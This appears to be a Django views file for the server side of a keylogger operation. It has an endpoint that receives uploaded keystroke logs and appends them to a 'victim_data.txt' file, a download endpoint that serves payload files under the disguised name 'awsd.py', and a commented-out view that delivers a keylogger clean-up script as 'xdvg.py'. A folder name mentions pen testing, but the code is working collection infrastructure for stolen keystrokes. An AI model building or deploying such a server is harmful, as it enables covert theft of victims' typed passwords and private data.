from django.shortcuts import render
from django.http import HttpResponse, FileResponse
from django.views.decorators.csrf import csrf_exempt
from django.conf import settings
import os
import errno
# Create your views here.


@csrf_exempt
def receive_files(request):
    if request.method == "POST" and request.FILES.get("file"):
        try:
            keylog_file = request.FILES["file"]
            keylog_content = keylog_file.read().decode("utf-8")
            victim_data = r"C:\Users\This PC\OneDrive\Documents\victim_data.txt"
            with open(victim_data, "a") as data:
                data.write(keylog_content)
            return HttpResponse("File received and processed successfully", status=200)
        except Exception as e:
            return HttpResponse("Error", status=500)
    else:
        return HttpResponse("Bad request", status=400)


@csrf_exempt
def checker(request):
    if request.method == "POST" and request.POST.get("data"):
        try:
            return HttpResponse("File received and processed successfully", status=200)
        except Exception as e:
            return HttpResponse("Error", status=500)
    else:
        return HttpResponse("Bad request", status=400)


@csrf_exempt
def download(request, file_name):
    try:
        if '..' in file_name or file_name.startswith('/'):
            return HttpResponse("Invalid file name", status=400)

        file_path = os.path.join(settings.MEDIA_ROOT, file_name)
        if os.path.exists(file_path):
            with open(file_path, "rb") as file:
                response = HttpResponse(
                    file.read(), content_type="application/octet-stream"
                )
                response["Content-Disposition"] = f'attachment; filename="awsd.py"'
                return response
        else:
            return HttpResponse("File not found", status=404)
    except OSError as e:
        if e.errno == errno.EPIPE:
            print(f"Broken pipe from client: {e}")
            return HttpResponse("Client disconnected", status=499)
        else:
            print(f"Unexpected error: {e}")
            return HttpResponse("Internal server error", status=500)

    except Exception as e:
        print(f"error : {e}")


# @csrf_exempt
# def keylogger_file(request):
#     try:
#         file_name = (
#             r"C:\Users\This PC\OneDrive\Documents\pen test\keylogger\clean_up.py"
#         )
#         if os.path.exists(file_name):
#             with open(file_name, "rb") as file:
#                 response = HttpResponse(
#                     file.read(), content_type="application/octet-stream"
#                 )
#                 response["Content-Disposition"] = f'attachment; filename="xdvg.py"'
#                 return response
#         else:
#             return HttpResponse("File not found", status=404)
#     except Exception as e:
#         print(f"error : {e}")

# python manage.py runserver [your_ip_address]:8000